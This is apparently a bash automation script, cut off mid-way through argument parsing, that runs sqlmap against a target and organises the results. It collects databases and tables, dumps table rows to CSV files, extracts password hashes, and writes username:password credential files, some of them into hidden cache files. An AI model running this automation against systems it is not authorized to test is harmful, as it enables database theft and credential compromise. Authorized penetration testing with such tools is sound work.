#!/bin/bash

# SQLMap Automation Script for Security Testing
# This script is intended for legal security testing only.
# Usage of this tool for attacking targets without prior mutual consent is illegal.

db=""
TARGET=""
host=""
# Configurable base directory - modify as needed
basedir="$HOME/Downloads/sqlmap_output"  # Using $HOME instead of hardcoded path
LOG_FILE=""
databases=() 
declare -A unique_entries
declare -A unique_data_rows  # To track unique data rows
dbms_name=""
dbs=""
appenddbns=""
tables=()

# Hidden cache files for temporary storage of data during script execution
# These may contain sensitive information from the target database
HIDDEN_DBS_CACHE=""
HIDDEN_PASSWORDS_CACHE=""

# Function to extract system and user information from sqlmap output
extract_system_info() {
    local input_file=$LOG_FILE
    local system_info=""
    
    # Check if the file exists
    if [ ! -f "$input_file" ]; then
        return 0
    fi
    
    # Extract the actual system hostname (not the database user)
    if grep -q "hostname:" "$input_file"; then
        # Extract the actual hostname value enclosed in quotes
        hostname=$(grep -m 1 "hostname:" "$input_file" | grep -o "'[^']*'" | sed "s/'//g")
        if [ -n "$hostname" ]; then
            system_info+="Hostname: $hostname\n"
        fi
    fi
    
    # Extract web server OS info
    if grep -q "web server operating system:" "$input_file"; then
        os_info=$(grep -m 1 "web server operating system:" "$input_file" | sed 's/web server operating system: //')
        if [ -n "$os_info" ]; then
            system_info+="OS: $os_info\n"
        fi
    fi
    
    # Extract web server technology info
    if grep -q "web application technology:" "$input_file"; then
        web_tech=$(grep -m 1 "web application technology:" "$input_file" | sed 's/web application technology: //')
        if [ -n "$web_tech" ]; then
            system_info+="Web Server: $web_tech\n"
        fi
    fi
    
    # Extract DBMS version info
    if grep -q "back-end DBMS:" "$input_file"; then
        dbms_version=$(grep -m 1 "back-end DBMS:" "$input_file" | sed 's/back-end DBMS: //')
        if [ -n "$dbms_version" ]; then
            system_info+="Database: $dbms_version\n"
        fi
    fi
    
    # Arrays to store unique users and roles
    declare -A unique_users
    declare -A unique_roles
    
    # Extract current database
    if grep -q "current database:" "$input_file"; then
        current_db=$(grep -A 2 "current database:" "$input_file" | grep -v "current database:" | grep "^\[.*\]" | head -1 | sed 's/^\[.*\] //')
        if [ -n "$current_db" ]; then
            system_info+="Current Database: $current_db\n"
        fi
    fi
        
    # Database Users and User Privileges/Roles sections have been completely removed
    # These sections were extracting database users and their roles
    # but are no longer needed for the structure log
    
    # Extract privilege escalation info
    if grep -q "available databases" "$input_file" && grep -q "privilege escalation" "$input_file"; then
        system_info+="Privilege Escalation:\n"
        # Mark the start of the privilege escalation section
        in_privesc_section=false
        privesc_found=false
        
        while IFS= read -r line; do
            if [[ "$line" =~ "privilege escalation" ]]; then
                in_privesc_section=true
                continue
            fi
            
            if [ "$in_privesc_section" = true ]; then
                # Look for privilege escalation details, which are typically preceded by [*]
                if [[ "$line" =~ ^\[.\]\ (.+) ]]; then
                    privesc="${BASH_REMATCH[1]}"
                    system_info+="  $privesc\n"
                    privesc_found=true
                # End of section - empty line or another section header
                elif [[ -z "$line" || "$line" =~ ^\[.[+!]\] ]]; then
                    in_privesc_section=false
                    break
                fi
            fi
        done < "$input_file"
        
        # If no privilege escalation info was found, remove the header
        if [ "$privesc_found" = false ]; then
            system_info=$(echo -e "$system_info" | sed '/Privilege Escalation:/d')
        fi
    fi
    
    echo -e "$system_info"
}

# Function to rebuild the structure log file with consistent formatting
rebuild_structure_log() {
    local dbms="$1"
    local databases="$2"
    local output_file="$3"
    local temp_file=$(mktemp)
    
    # Create an empty file
    > "$temp_file"
    
    # 1. DBMS header section
    echo "DBMS: $dbms" >> "$temp_file"
    
    # 2. System information section
    system_info=$(extract_system_info)
    if [ -n "$system_info" ]; then
        echo "" >> "$temp_file"
        echo "System Information:" >> "$temp_file"
        echo -e "$system_info" | sed 's/^/  /' >> "$temp_file"
    fi
    
    echo "" >> "$temp_file"
    
    # 3. Databases section
    echo "Databases:" >> "$temp_file"
    
    # Add databases list, sorted and uniquified
    # Filter out empty lines and add proper indentation
    if [ -n "$databases" ]; then
        echo "$databases" | grep -v "^$" | sort -u | sed 's/^/  /' >> "$temp_file"
        echo "" >> "$temp_file"
    fi
     
    
    # Get list of databases that have tables from the existing table files
    dbs_with_tables=()
    found_tables=false
    
    # First, collect databases with tables by finding table files
    for db in $(echo "$databases" | grep -v "^$" | sort -u); do
        # Check if we have table files for this database
        table_files=$(find "$result_dir/$db" -name "$db.*.log" 2>/dev/null || echo "")
        
        # If table files exist, add this database to the list
        if [ -n "$table_files" ]; then
            dbs_with_tables+=("$db")
            found_tables=true
        fi
    done
    
    # Now add each database with tables to the structure file
    for ((i=0; i<${#dbs_with_tables[@]}; i++)); do
        db="${dbs_with_tables[$i]}"
        
        # Add database header
        
        echo "database $db:" >> "$temp_file"
        echo " tables:" >> "$temp_file"
        
        # Get table names from file names
        table_names=$(find "$result_dir/$db" -name "$db.*.log" | sed -n "s|.*/\($db\.\)\(.*\)\.log|\2|p" | sort)
        
        # Add table names
        if [ -n "$table_names" ]; then
            echo "$table_names" | sed 's/^/   /' >> "$temp_file"
        fi
        
        # Add blank line after each database except the last one
        if [ $i -lt $((${#dbs_with_tables[@]} - 1)) ]; then
            echo "" >> "$temp_file"
        fi
    done
    
    # Replace the original file with our correctly formatted one
    mv "$temp_file" "$output_file"
    
    # Make sure temp file is cleaned up if anything went wrong
    [ -f "$temp_file" ] && rm -f "$temp_file"
}

# Function to display usage
usage() {
    echo "Usage: $0 -r <request-file> | -u <url-or-ip> [-d <dbms>]"
    echo "Options:"
    echo "  -r  Specify the request file for sqlmap"
    echo "  -u  Specify the target URL or IP address for sqlmap"
    echo "  -d  Specify the DBMS type (optional)"
    exit 1
}

# Function to merge cached data to main logs
merge_cache_files() {
    # Merge database structure cache if it exists
    if [ -f "$HIDDEN_DBS_CACHE" ] && [ -f "$logdbs" ]; then
        echo "Found hidden cache for database structure, merging..."
        
        # Ensure we don't duplicate entries by checking for DBMS
        if ! grep -q "DBMS:" "$logdbs"; then
            grep "DBMS:" "$HIDDEN_DBS_CACHE" >> "$logdbs" 2>/dev/null
        fi
        
        # Add databases if they don't exist
        if ! grep -q "Databases:" "$logdbs"; then
            # Extract the Databases section from hidden cache
            awk '/Databases:/,/^$/ {print}' "$HIDDEN_DBS_CACHE" >> "$logdbs" 2>/dev/null
        fi
        
        # Add database structure (tables, etc)
        awk '/^database /,/^$/ {print}' "$HIDDEN_DBS_CACHE" >> "$logdbs" 2>/dev/null
        
        echo "Merged database structure from cache."
    fi
    
    # Merge password hashes cache if it exists
    if [ -f "$HIDDEN_PASSWORDS_CACHE" ] && [ -f "$passfile" ]; then
        echo "Found hidden cache for password hashes, merging..."
        
        # Add unique password entries from cache to main file
        while IFS= read -r line; do
            if ! grep -Fq "$line" "$passfile"; then
                echo "$line" >> "$passfile"
            fi
        done < "$HIDDEN_PASSWORDS_CACHE"
        
        echo "Merged password hashes from cache."
    fi
}

capture_password_hashes() {
    # SECURITY NOTE: This function extracts password hashes for authorized security testing.
    local input_file=$LOG_FILE
    passfile="$result_dir/sqlmap_passwords.log"
    
    # Check if the password file exists, if not create it
    if [ ! -f "$passfile" ]; then
        touch "$passfile"
    fi
    
    # Temporary variables
    current_user=""
    seen_hashes=() # To store already seen hashes
    
    # Read the file line by line
    while IFS= read -r line; do

        # Capture the username (the line with the username pattern)
        if [[ "$line" =~ \[\*\]\ ([^\ ]+)\ \[[0-9]+\]: ]]; then
            current_user="${BASH_REMATCH[1]}"

            continue
        fi
        
        # Check for lines that contain a password hash
        if [[ "$line" =~ .*password\ hash:\ (.*) ]]; then
            password_hash="${BASH_REMATCH[1]}"
            
            # Skip if the password hash is NULL
            if [[ "$password_hash" == "NULL" ]]; then
                continue
            fi
            
            # Check if we've already seen this hash (to avoid duplicates)
            if [[ " ${seen_hashes[@]} " =~ " $password_hash " ]]; then
                continue
            fi
            
            # Add the hash to the seen_hashes array
            seen_hashes+=("$password_hash")
            
            # Output the result
            if [ -n "$current_user" ]; then
                echo "User: $current_user - Password Hash: $password_hash" | tee -a "$passfile" -a "$HIDDEN_PASSWORDS_CACHE"
            else
                echo "Password Hash: $password_hash (No username associated)" | tee -a "$passfile" -a "$HIDDEN_PASSWORDS_CACHE"
            fi
        fi
    done < "$input_file"
}

# Function to check if DBMS and Databases have values
check_dbms_and_dbs() {
    if [ ! -f "$LOG_FILE" ]; then
        return 0
    fi
    
    # Extract database and DBMS information
    dbs=$(extract_databases)
    dbms_name=$(extract_dbms)

    # Check if we already have both DBMS and databases information
    if [ -n "$dbms_name" ] && [ -n "$dbs" ]; then
        echo "DBMS ($dbms_name) and Databases have already been extracted."
        read -p "Do you want to run sqlmap again anyway? (y/n): " rerun
        if [[ "$rerun" != "y" && "$rerun" != "Y" ]]; then
            return 1  # Skip the initial sqlmap
        fi
    fi
    return 0  # Run sqlmap
}


# Function to capture database, table, and data, and save it to the log and to table-specific files
capture_table_data() {
    local input_file=$LOG_FILE
    
    # Ensure database directories exist
    ensure_db_dirs
    
    # Temporary variables to store the database and table name
    current_db=""
    current_table=""
    
    # Flag to track data rows
    capture_data="false"
    
    # Temporary array to store table data rows
    declare -a table_data_rows
    declare -a table_header_rows
    
    # Associative arrays to track what we've already processed
    declare -A processed_dbs
    declare -A processed_tables
    
    # Read the file line by line
    while read -r line; do
        # Look for the Database name
        if [[ "$line" =~ ^Database:\ (.*) ]]; then
            # If we were capturing data for a previous table, save it to a table-specific file before moving on
            if [[ -n "$current_db" && -n "$current_table" && ${#table_data_rows[@]} -gt 0 ]]; then
                save_table_data_to_file "$current_db" "$current_table" "${table_header_rows[@]}" "${table_data_rows[@]}"
                # Reset the arrays
                table_data_rows=()
                table_header_rows=()
            fi
            
            # Extract database name and trim whitespace
            current_db="${BASH_REMATCH[1]}"
            current_db=$(echo "$current_db" | xargs)
            
            # Skip if database name is empty
            if [[ -z "$current_db" ]]; then
                continue
            fi
            
            # Prepare database directories
            logdbfolder="$result_dir/$current_db"

            if [ ! -d "$logdbfolder" ]; then
                mkdir -p "$logdbfolder"
            fi
            
            # Don't capture data until a table is found
            capture_data="false"
            
            # Check if this is the first time we've seen this database in this run
            if [[ -z "${processed_dbs[$current_db]}" ]]; then
                processed_dbs["$current_db"]="1"
                
                # Make sure this DB is in the structure file and directory exists
                extract_tables "$current_db"
                
                # Ensure the database directory exists
                db_dir="$result_dir/$current_db"
                if [ ! -d "$db_dir" ]; then
                    mkdir -p "$db_dir"
                fi
            fi
        
        # Look for the Table name
        elif [[ "$line" =~ ^Table:\ (.*) ]]; then
            # Skip if we don't have a valid database name
            if [[ -z "$current_db" ]]; then
                continue
            fi
            
            # If we were capturing data for a previous table, save it before moving on
            if [[ -n "$current_table" && ${#table_data_rows[@]} -gt 0 ]]; then
                save_table_data_to_file "$current_db" "$current_table" "${table_header_rows[@]}" "${table_data_rows[@]}"
                # Reset the arrays
                table_data_rows=()
                table_header_rows=()
            fi
            
            # Extract table name and trim whitespace
            current_table="${BASH_REMATCH[1]}"
            current_table=$(echo "$current_table" | xargs)
            
            # Skip if table name is empty
            if [[ -z "$current_table" ]]; then
                continue
            fi
            
            capture_data="true"
            
            # Check if we've already processed this table in this run
            table_key="${current_db}_${current_table}"
            if [[ -z "${processed_tables[$table_key]}" ]]; then
                processed_tables[$table_key]="1"
                
                # Mark this table for processing; no need to update any log file now
            fi
        
        # Capture the data after the table line - only if we have valid database and table
        elif [ "$capture_data" = "true" ] && [[ -n "$current_db" ]] && [[ -n "$current_table" ]]; then
            # Check for the data format (assuming it's a table dump)
            if [[ "$line" =~ ^\+ ]]; then
                # Store header row for table file
                table_header_rows+=("$line")
                
                # Mark that we've processed this table header
                table_key="${current_db}_${current_table}"
                if [[ "${processed_tables[$table_key]}" == "1" ]]; then
                    # Mark as header processed
                    processed_tables[$table_key]="2"
                fi
            elif [[ "$line" =~ ^\| ]]; then
                # Store data row for table file
                table_data_rows+=("$line")
                
                # Create a hash for the row to track uniqueness for deduplication
                row_hash=$(echo "$line" | md5sum | cut -d ' ' -f1)
                
                if [[ -z "${unique_data_rows[$row_hash]}" ]]; then
                    unique_data_rows[$row_hash]="1"
                fi
            elif [[ "$line" =~ ^Database: || "$line" =~ ^Table: ]]; then
                # If we hit a new database or table line, stop capturing and process what we have
                if [[ -n "$current_db" && -n "$current_table" && ${#table_data_rows[@]} -gt 0 ]]; then
                    save_table_data_to_file "$current_db" "$current_table" "${table_header_rows[@]}" "${table_data_rows[@]}"
                    # Reset the arrays for next table
                    table_data_rows=()
                    table_header_rows=()
                    capture_data="false"
                fi
                # Reprocess this line in the next iteration
                continue
            fi
        fi
    done < "$input_file"
    
    # Save any remaining table data
    if [[ -n "$current_db" && -n "$current_table" && ${#table_data_rows[@]} -gt 0 ]]; then
        save_table_data_to_file "$current_db" "$current_table" "${table_header_rows[@]}" "${table_data_rows[@]}"
    fi
}

# Function to ensure database directories exist
ensure_db_dirs() {
    # Only process databases present in the structure file
    if [ -f "$logdbs" ]; then
        # Use an array to properly handle database names that might contain spaces
        mapfile -t db_names < <(awk '/^database ([^:]+):/ {print $2}' "$logdbs" | sed 's/://' | sort -u)
        
        for db in "${db_names[@]}"; do
            # Skip empty database names
            if [ -z "$db" ]; then
                continue
            fi
            
            # Normalize database name for consistency
            db=$(normalize_db_name "$db")
            
            # Create directory for this database if it doesn't exist
            db_log_dir="$result_dir/$db"
            if [ ! -d "$db_log_dir" ]; then
                if ! mkdir -p "$db_log_dir" 2>/dev/null; then
                    echo "Error: Failed to create directory $db_log_dir"
                    continue
                fi
            fi
        done
    fi
}

# Helper function to save table data to a table-specific file
save_table_data_to_file() {
    local db="$1"
    local table="$2"
    shift 2  # Shift past the first two args
    
    # Skip if db or table is empty
    if [ -z "$db" ] || [ -z "$table" ]; then
        return 0
    fi
    
    # Create a unique key to track what we've processed in this run
    # This prevents multiple messages for the same file in one run
    local process_key="${db}_${table}_processed"
    
    # If we've already processed this table in this run, skip it
    if [ -n "${!process_key}" ]; then
        return 0
    fi
    
    # Mark this table as processed for this run
    declare -g "$process_key=1"
    
    # The rest of the arguments are the table header and data rows
    # Use the requested naming convention: DBNAME.tablename.log for tables
    local table_file="$result_dir/$db/${db}.${table}.log"
    local csv_file="$result_dir/$db/${db}.${table}.csv"
    local table_file_exists="false"
    
    # Check if file exists and has content
    if [ -f "$table_file" ] && [ -s "$table_file" ]; then
        table_file_exists="true"
    fi
    
    # If the file doesn't exist or is empty, create it with the data
    if [ "$table_file_exists" != "true" ]; then
        # Create the directory if it doesn't exist
        local table_dir=$(dirname "$table_file")
        if [ ! -d "$table_dir" ]; then
            mkdir -p "$table_dir"
        fi
        
        # Extract column names from the header row
        local header_row=""
        for arg in "$@"; do
            if [[ "$arg" =~ ^\| ]]; then
                # Extract column names from the row (format: | col1 | col2 | ...)
                header_row=$(echo "$arg" | sed -E 's/\|[[:space:]]*([^|]*)[[:space:]]*\|/\1/g' | sed -E 's/[[:space:]]+/,/g')
                break
            fi
        done
        
        # Write to the log file in original format
        echo "# Table: $db.$table" > "$table_file"
        echo "# Extracted: $(date)" >> "$table_file"
        echo "" >> "$table_file"
        
        # Write all rows in the original format
        for arg in "$@"; do
            if [[ "$arg" =~ ^\+ || "$arg" =~ ^\| ]]; then
                echo "$arg" >> "$table_file"
            fi
        done
        
        # Also create a CSV version for easier processing
        if [ -n "$header_row" ]; then
            echo "$header_row" > "$csv_file"
            
            # Write the data rows to CSV
            for arg in "$@"; do
                if [[ "$arg" =~ ^\| ]] && [[ "$arg" != "$header_row" ]]; then
                    # Convert table format to CSV (replace | with nothing, and space with commas)
                    echo "$arg" | sed -E 's/\|[[:space:]]*([^|]*)[[:space:]]*\|/\1/g' | sed -E 's/[[:space:]]+/,/g' >> "$csv_file"
                fi
            done
        fi
        # Also copy any HTML files from sqlmap's dump directory
        sqlmap_dump_dir="$basedir/$host/dump/$db"
        if [ -d "$sqlmap_dump_dir" ]; then
            # Find all HTML files in the sqlmap dump directory
            html_files=$(find "$sqlmap_dump_dir" -name "*.html" 2>/dev/null)
            
            if [ -n "$html_files" ]; then
                for html_file in $html_files; do
                    # Get the filename without path
                    filename=$(basename "$html_file")
                    # Copy to our structured output directory
                    cp "$html_file" "$result_dir/$db/$filename"
                    echo "html files saved at $result_dir/$db/$filename"
                done
            fi
        fi
        
        # For certain table names, create additional useful files
        local table_lower=$(echo "$table" | tr '[:upper:]' '[:lower:]')
        
        # Check for tables that might contain credential info
        # SECURITY NOTE: This section extracts credentials for authorized security testing only.
        if [[ "$table_lower" == *"user"* || "$table_lower" == *"admin"* || "$table_lower" == *"member"* ]]; then
            # Create a special creds file if the table contains username/password columns
            if [[ "$header_row" == *"user"*","*"pass"* || "$header_row" == *"name"*","*"pass"* ]]; then
                local creds_file="$result_dir/$db/${db}.creds.${table}.txt"
                echo "# Credentials from $db.$table" > "$creds_file"
                echo "# Format: username:password" >> "$creds_file"
                echo "# SECURITY WARNING: This file contains sensitive data extracted during security testing" >> "$creds_file"
                echo "# Use only for authorized testing purposes" >> "$creds_file"
                # Add extracted credentials
                tail -n +2 "$csv_file" | sed -E 's/^([^,]*),([^,]*).*/\1:\2/' >> "$creds_file"
                echo "Credentials extracted to: $creds_file"
            fi
        fi
        
        echo "Data saved to: $table_file"
    else
        # Only echo this message once per run
        echo "Table already exists: ${db}.${table}.log"
    fi
}

 

# Helper function to normalize database names
normalize_db_name() {
    local name="$1"
    # Trim whitespace completely
    echo "$name" | sed 's/^[[:space:]]*//;s/[[:space:]]*$//'
}

# Function to extract databases from the sqlmap output
extract_databases() {
    local input_file=$LOG_FILE
    
    # Create an associative array to store unique database names
    declare -A found_dbs
    
    # Also check structure log file for any databases we've already found
    if [ -f "$logdbs" ]; then
        while read -r line; do
            # Check for database entries in the format "database name:"
            if [[ "$line" =~ ^database[[:space:]]+([^:]+): ]]; then
                db_name=$(normalize_db_name "${BASH_REMATCH[1]}")
                # Ensure the database name is not empty
                if [[ -n "$db_name" ]]; then
                    found_dbs["$db_name"]="1"
                fi
            fi
        done < "$logdbs"
    fi
    
    # Read the sqlmap log file for database mentions
    local databases_found="false"
    local db_list_mode="false"
    
    while read -r line; do
        # Pattern 1: Look for 'available databases' section and following entries
        if [[ "$line" =~ available\ databases\ \[.*\] ]]; then
            databases_found="true"
        elif [[ "$databases_found" == "true" ]] && [[ "$line" =~ ^\[\*\]\ (.*) ]]; then
            db_name=$(normalize_db_name "${BASH_REMATCH[1]}")
            # Ensure the database name is not empty
            if [[ -n "$db_name" ]]; then
                found_dbs["$db_name"]="1"
            fi
        elif [[ "$databases_found" == "true" ]] && [[ ! "$line" =~ ^\[\*\] ]] && [[ -n "$line" ]]; then
            databases_found="false"
        
        # Pattern 2: Database mentioned in fetch messages
        elif [[ "$line" =~ fetching\ .*\ for\ database:\ \'([^\']+)\' ]]; then
            db_name=$(normalize_db_name "${BASH_REMATCH[1]}")
            # Ensure the database name is not empty
            if [[ -n "$db_name" ]]; then
                found_dbs["$db_name"]="1"
            fi
        
        # Pattern 3: Direct Database: mention (this catches "Database: sqhell_2" lines)
        elif [[ "$line" =~ ^Database:\ ([^[:space:]]+) ]]; then
            db_name=$(normalize_db_name "${BASH_REMATCH[1]}")
            # Ensure the database name is not empty
            if [[ -n "$db_name" ]]; then
                found_dbs["$db_name"]="1"
            fi
        
        # Pattern 4: Table references with database.table format
        elif [[ "$line" =~ table\ \'([^\.]+)\.[^\']+\' ]]; then
            db_name=$(normalize_db_name "${BASH_REMATCH[1]}")
            # Ensure the database name is not empty
            if [[ -n "$db_name" ]]; then
                found_dbs["$db_name"]="1"
            fi
        
        # Pattern 5: databases listed under "Databases:" heading - MODIFIED to handle indentation better
        elif [[ "$line" == "Databases:" ]]; then
            db_list_mode="true"
        elif [[ "$db_list_mode" == "true" ]] && [[ "$line" =~ ^[[:space:]]*([a-zA-Z0-9_]+)[[:space:]]*$ ]]; then
            db_name=$(normalize_db_name "${BASH_REMATCH[1]}")
            # Ensure the database name is not empty
            if [[ -n "$db_name" ]]; then
                found_dbs["$db_name"]="1"
            fi
        elif [[ "$db_list_mode" == "true" ]] && [[ -z "$line" ]]; then
            db_list_mode="false"
        fi
    done < "$input_file"
    
    # Print all found databases
    if [[ ${#found_dbs[@]} -gt 0 ]]; then
        for db in "${!found_dbs[@]}"; do
            if [[ -n "$db" ]]; then  # Ensure no empty database names
                echo "$db"
            fi
        done
        return 0
    else
        return 1
    fi
}

# Function to extract the DBMS name from the sqlmap output
extract_dbms() {
    local input_file=$LOG_FILE
        
    # Search for the line containing 'back-end DBMS: ' and extract the DBMS name
    while read -r line; do
        if [[ "$line" =~ back-end\ DBMS:\ (.*) ]]; then
            dbms="${BASH_REMATCH[1]}"
            # Extract the first word before '>=', space, or any other separator
            first_word=$(echo "$dbms" | awk '{print $1}')
            echo "$first_word"
            return 0
        fi
    done < "$input_file"
    
    # If no match is found
   # echo "DBMS not found"
    return 1
}
 

extract_host_info() {
    local input_file="$1"
    
    # Check if the file exists
    if [ ! -f "$input_file" ]; then
        echo "File not found!"
        return 1
    fi
    
    # First try standard HTTP format (direct Host: header)
    while IFS= read -r line; do
        # Look for Host header in standard HTTP format
        if [[ "$line" =~ ^Host:\ *([^$'\r']+) ]]; then
            full_host="${BASH_REMATCH[1]}"
            # Trim whitespace
            full_host=$(echo "$full_host" | tr -d '[:space:]')
            
            # Extract only the hostname part (before the colon if a port exists)
            if [[ "$full_host" =~ ^([^:]+) ]]; then
                hostname_only="${BASH_REMATCH[1]}"
                echo "$hostname_only"
                return 0
            else
                echo "$full_host"
                return 0
            fi
        fi
    done < "$input_file"
    
    # If not found, try base64 encoded format (for Burp saved requests)
    while IFS= read -r line; do
        if [[ $line =~ \<request\ base64=\"true\"\>\<\!\[CDATA\[([^]]+)\]\]\>\<\/request\> ]]; then
            base64_content="${BASH_REMATCH[1]}"
            # Decode base64 and look for Host header
            decoded_content=$(echo "$base64_content" | base64 -d)
            if [[ "$decoded_content" =~ Host:\ *([^$'\r']+) ]]; then
                full_host="${BASH_REMATCH[1]}"
                # Trim whitespace
                full_host=$(echo "$full_host" | tr -d '[:space:]')
                
                # Extract only the hostname part (before the colon if a port exists)
                if [[ "$full_host" =~ ^([^:]+) ]]; then
                    hostname_only="${BASH_REMATCH[1]}"
                    echo "$hostname_only"
                    return 0
                else
                    echo "$full_host"
                    return 0
                fi
            fi
        fi
    done < "$input_file"
    
    # If no host found
    echo "No host information found in file"
    return 1
}
 
extract_tables() {
    local target_db="$1"
    local input_file=$LOG_FILE
    local output_log=$logdbs
    
    # Flags to track section
    local db_section_found="false"
    local tables_section="false"
    local tables_found="false"
    local table_count_found="false"
    
    # Temporary array to store tables
    declare -a tables
    
    # First check if we already have tables for this DB in the output_log
    # and load them into our tables array
    if [ -f "$output_log" ] && grep -q "^database ${target_db}:" "$output_log"; then
        while IFS= read -r line; do
            if [[ "$line" =~ ^[[:space:]]+([a-zA-Z0-9_]+)$ ]]; then
                table_name="${BASH_REMATCH[1]}"
                # Check if this table is already in our array
                if [[ ! " ${tables[@]} " =~ " ${table_name} " ]]; then
                    tables+=("$table_name")
                    tables_found="true"
                fi
            fi
        done < <(sed -n "/^database ${target_db}:/,/^database /p" "$output_log" | grep -A 100 "tables:" | grep -v "tables:")
    fi
    
    # Read the file line by line to find new tables
    while IFS= read -r line; do
        # Reset state when we encounter a new database section that isn't our target
        if [[ "$line" =~ ^Database:\ ([^$]+)$ ]] && [[ "${BASH_REMATCH[1]}" != "$target_db" ]]; then
            db_section_found="false"
            tables_section="false"
            table_count_found="false"
            continue
        fi
        
        # Look for the database section for our target DB
        if [[ "$line" =~ ^Database:\ *${target_db}$ ]]; then
            db_section_found="true"
            tables_section="false"
            table_count_found="false"
            continue
        fi
        
        # Look for the table count indicator that comes right after our database declaration
        if [ "$db_section_found" = "true" ] && [[ "$line" =~ ^\[.*[[:space:]]tables?\]$ ]]; then
            table_count_found="true"
            tables_section="true"
            continue
        fi
        
        # Capture table names that follow the table count indicator
        if [ "$db_section_found" = "true" ] && [ "$tables_section" = "true" ] && [ "$table_count_found" = "true" ]; then
            # Skip the separator line
            if [[ "$line" =~ ^\+[-]+\+$ ]]; then
                continue
            fi
            
            # Extract table name (remove leading/trailing |)
            if [[ "$line" =~ ^\|[[:space:]]*([^[:space:]|]+)[[:space:]]*\|$ ]]; then
                table_name="${BASH_REMATCH[1]}"
                # Only add if not already in the array
                if [[ ! " ${tables[@]} " =~ " ${table_name} " ]]; then
                    tables+=("$table_name")
                    tables_found="true"
                fi
                
                # Create array name using db.table format for later use
                safe_db_name="${target_db//[^a-zA-Z0-9_]/_}"
                safe_table_name="${table_name//[^a-zA-Z0-9_]/_}"
                array_name="${safe_db_name}_${safe_table_name}"
                
                # Declare the array
                declare -ag "${array_name}_data"
            elif [[ -n "$line" && ! "$line" =~ ^\| ]]; then
                # End of table list section
                table_count_found="false"
                tables_section="false"
                break
            fi
        fi
        
        # Additional pattern: Table direct mention format
        if [[ "$line" =~ ^Table:\ ([^[:space:]]+) ]] && [[ "$db_section_found" == "true" ]]; then
            table_name="${BASH_REMATCH[1]}"
            # Only add if not already in the array
            if [[ ! " ${tables[@]} " =~ " ${table_name} " ]]; then
                tables+=("$table_name")
                tables_found="true"
            fi
        fi
        
        # Look for 'tables of database' pattern
        if [[ "$line" =~ tables[[:space:]]+for[[:space:]]+database:[[:space:]]+${target_db} ]]; then
            tables_section="true"
            continue
        fi
        
        # Extract table names after the pattern [*] table_name
        if [ "$tables_section" = "true" ] && [[ "$line" =~ ^\[\*\]\ ([^[:space:]]+) ]]; then
            table_name="${BASH_REMATCH[1]}"
            # Only add if not already in the array
            if [[ ! " ${tables[@]} " =~ " ${table_name} " ]]; then
                tables+=("$table_name")
                tables_found="true"
            fi
        fi
    done < "$input_file"
    
    # If tables were found, update the log file and export the arrays
    if [ "$tables_found" = "true" ]; then
        # Now we have all tables in our array, update the structure file
        safe_db_name="${target_db//[^a-zA-Z0-9_]/_}"
        
        # Remove existing database entry if it exists
        if grep -q "^database ${target_db}:" "$output_log"; then
            # Create a temporary file
            temp_file=$(mktemp)
            if [ $? -ne 0 ]; then
                echo "Error: Failed to create temporary file"
                return 1
            fi
            
            # Extract all content before this database section
            sed -n "1,/^database ${target_db}:/p" "$output_log" | head -n -1 > "$temp_file"
            
            # Find the next database section if it exists
            next_db_line=$(grep -n "^database " "$output_log" | grep -A1 "^database ${target_db}:" | tail -n 1 | cut -d: -f1)
            
            if [ -n "$next_db_line" ]; then
                # Append everything after the next database section
                tail -n +"$next_db_line" "$output_log" >> "$temp_file"
            fi
            
            # Replace the original file
            if ! mv "$temp_file" "$output_log"; then
                echo "Error: Failed to update database structure file"
                rm -f "$temp_file"  # Clean up temp file
                return 1
            fi
            
            # Make sure temp file is gone
            [ -f "$temp_file" ] && rm -f "$temp_file"
        fi
        
        # Add the updated database and tables to the log
        echo -e "\ndatabase ${target_db}:" >> "$output_log"
        echo " tables:" >> "$output_log"
        for table in "${tables[@]}"; do
            echo "   $table" >> "$output_log"
        done
        
        # Declare and export arrays
        declare -ag "${safe_db_name}_tables"
        eval "${safe_db_name}_tables=(${tables[@]})"
        export "${safe_db_name}_tables"
        
        for table in "${tables[@]}"; do
            safe_table_name="${table//[^a-zA-Z0-9_]/_}"
            array_name="${safe_db_name}_${safe_table_name}"
            declare -ag "${array_name}_data"
            export "${array_name}_data"
        done
        
        return 0
    else
        return 1
    fi
}

# Function to directly fetch tables for a specific database
fetch_tables_direct() {
    local target_db="$1"
    local temp_output_file=$(mktemp)
    
    echo "Directly fetching tables for database: $target_db"
    
    # Run sqlmap with --tables option just for this database
    sqlmap $TARGET -D "$target_db" --tables --ignore-stdin --batch --output-dir="$basedir" > "$temp_output_file"
    
    # Check if sqlmap completed successfully
    if [ $? -ne 0 ]; then
        echo "Failed to fetch tables for $target_db"
        rm "$temp_output_file"
        return 1
    fi
    
    # Extract table names from the sqlmap output
    echo "Tables in database $target_db:"
    
    # Parse the output file for table information
    local in_tables_section="false"
    local tables_found="false"
    
    while IFS= read -r line; do
        # Look for tables section indicator
        if [[ "$line" =~ "tables for database:" ]] && [[ "$line" =~ "$target_db" ]]; then
            in_tables_section="true"
            continue
        fi
        
        if [ "$in_tables_section" = "true" ]; then
            # Start of table list usually has a line with [*]
            if [[ "$line" =~ \[\*\] ]]; then
                tables_found="true"
            fi
            
            # Extract table name after [*]
            if [ "$tables_found" = "true" ] && [[ "$line" =~ ^\[\*\]\ (.+)$ ]]; then
                table_name="${BASH_REMATCH[1]}"
                echo "   $table_name"
                
                # Add to database structure log
                if ! grep -q "^   $table_name$" "$logdbs"; then
                    # First check if the database entry exists
                    if ! grep -q "^database ${target_db}:" "$logdbs"; then
                        echo -e "\ndatabase ${target_db}:" >> "$logdbs"
                        echo " tables:" >> "$logdbs"
                    fi
                    echo "   $table_name" >> "$logdbs"
                fi
            fi
            
            # End of table section detection
            if [ "$tables_found" = "true" ] && [[ ! "$line" =~ ^\[\*\] ]] && [[ -n "$line" ]]; then
                break
            fi
        fi
    done < "$temp_output_file"
    
    rm "$temp_output_file"
    return 0
}

# Function to refresh or verify the list of tables for a database

 
# Parse command line arguments
while getopts "r:u:d:" opt; do
    case $opt in
        r)
            REQUEST_FILE="$OPTARG"
            
            hostfromfile=$(extract_host_info $REQUEST_FILE)
            host=$hostfromfile
            host=$(echo "$host" | sed 's/:[0-9]*//')
            # Check if a host was found
            if [ -z "$host" ]; then
                echo "No host information found in the file!"
                exit 1
            fi

            LOG_FILE="$basedir/$host/log"
            ;;
        u)
            URL="$OPTARG"
            if [[ "$URL" =~ ^https?://([^/]+) ]]; then
                hostfromurl="${BASH_REMATCH[1]}"
            else
                hostfromurl=$(echo "$URL" | grep -oP '^[^/]+')
            fi
            host=$hostfromurl 
